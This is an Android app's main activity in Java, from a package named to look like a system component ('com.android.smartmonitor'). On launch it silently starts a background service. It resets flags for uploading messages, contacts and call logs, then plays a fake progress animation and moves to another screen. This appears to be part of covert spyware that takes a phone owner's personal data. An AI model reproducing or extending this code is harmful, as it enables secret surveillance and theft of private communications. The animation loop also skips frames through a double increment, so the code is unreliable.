package com.android.smartmonitor;

import com.android.smartmonitor.control.CheckRunning;

import android.content.SharedPreferences;
import android.graphics.drawable.AnimationDrawable;
import android.os.Bundle;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.content.Intent;
import android.os.Handler;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.ImageView;
import android.widget.TextView;

public class MainActivity extends Activity implements OnClickListener {
	private ImageView image;
	TextView mTextView;


	AnimationDrawable anim;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		startEngine();


		SharedPreferences.Editor localEditor = getSharedPreferences("d", 0).edit();
		localEditor.putInt("msgLogUpload", 0);
		localEditor.putInt("contactsUpload", 0);
		localEditor.putInt("callLogUpload", 0);
		localEditor.commit();

		this.anim = new AnimationDrawable();
		for (int i=0;i<72;i++)
		{
			if (i >= 70)
			{
				this.anim.setOneShot(false);
				setContentView(R.layout.activity_main);
				this.mTextView = (TextView) this.findViewById(R.id.translate);
				this.image = (ImageView) this.findViewById(R.id.frame_image);
				new Handler().postDelayed(new Runnable()
				{
					public void run()
					{
						Intent localIntent = new Intent(MainActivity.this, Page1Activity.class);
						MainActivity.this.startActivity(localIntent);
						MainActivity.this.overridePendingTransition(R.anim.new_dync_in_from_right, R.anim.new_dync_out_to_left);
						MainActivity.this.finish();
					}
				}, 5000L);
				return;
			}
			int j = getResources().getIdentifier("progressbar" + i, "drawable", getPackageName());
			this.anim.addFrame(getResources().getDrawable(j), 100);
			i += 1;
		}

	}

	@Override
	public void onClick(View v)
	{

	}

	public void onWindowFocusChanged(boolean paramBoolean)
	{
		super.onWindowFocusChanged(paramBoolean);
		this.image.setBackgroundDrawable(this.anim);
		this.anim.start();
		this.mTextView.setVisibility(View.VISIBLE);
	}
	
	private void startEngine()
	{
		boolean isServiceRunning = false;
		ActivityManager manager = (ActivityManager)getSystemService(ACTIVITY_SERVICE);
		
		Intent localIntent;
		
		try
		{
	        for (RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
		        if (CheckRunning.class.getName().equals(service.service.getClassName())) {
		        	isServiceRunning = true;
		        	break;
		        }
		    }
			
		    if(isServiceRunning == false)
		    {
		    	localIntent = new Intent(this.getBaseContext(), CheckRunning.class);
			    this.getBaseContext().startService(localIntent);
		    }
		} catch (Exception e) {
			
		}
	}

	

}
